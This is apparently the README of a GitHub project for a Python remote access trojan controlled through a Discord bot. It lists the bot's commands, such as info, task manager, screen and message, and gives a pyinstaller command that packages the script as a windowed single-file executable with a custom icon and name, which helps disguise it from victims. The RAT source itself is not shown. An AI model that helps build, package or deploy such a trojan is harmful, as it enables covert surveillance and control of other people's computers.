# Discord-Rat
Simple python rat with discord bot control


Bot commands:
r/info, r/taskmgr,  r/echo(broken), r/calc, r/brow, r/screen, r/spam(in work), r/msg

Build .exe with pyinstaller

```sh
pyinstaller --noconfirm --onefile --windowed --icon "icon file" --name "APP NAME" --collect-all "discord"  "script dir"
```
